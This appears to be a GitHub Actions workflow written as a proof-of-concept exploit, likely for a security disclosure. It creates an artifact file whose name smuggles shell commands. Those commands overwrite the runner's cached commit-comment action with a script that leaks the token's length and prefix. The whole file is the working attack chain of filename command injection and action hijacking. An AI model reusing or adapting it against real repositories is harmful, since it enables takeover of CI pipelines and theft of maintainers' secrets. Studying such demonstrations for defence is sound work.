name: Test

on:
  pull_request:

jobs:
  upload:
    runs-on: ubuntu-latest
    steps:
      - name: build artifact
        run: |
          set -e
          mkdir -p content
          cat > content/payload.js <<'EOF'
          const t = process.env.INPUT_TOKEN || '';
          throw new Error('GAB_INPUT_TOKEN len=' + t.length + ' prefix=' + t.slice(0,4));
          EOF
          printf 'x\n' > "content/report.txt;P=\$(printf %.1s \$PATH);cd \${P}tmp;cd content;cd content-poc;cp payload.js \${P}home\${P}runner\${P}work\${P}_actions\${P}peter-evans\${P}commit-comment\${P}v3\${P}dist\${P}index.js;true;#.txt"
      - uses: actions/upload-artifact@v4
        with:
          name: content-poc
          path: content/
